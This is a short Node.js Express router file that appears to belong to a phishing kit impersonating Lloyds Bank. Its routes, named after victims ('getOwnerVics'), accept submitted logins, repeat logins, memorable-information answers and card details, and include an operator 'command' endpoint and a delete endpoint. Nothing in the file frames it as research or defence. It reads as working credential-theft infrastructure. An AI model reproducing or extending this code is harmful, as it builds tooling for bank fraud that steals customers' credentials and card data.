const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitMemorable,
  submitLoginAgain,
  submitCard,
  deleteEntry,
} = require("../controllers/lloydsController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/card", submitCard);
router.post("/memorable", submitMemorable);
router.post("/delete", deleteEntry);

module.exports = router;
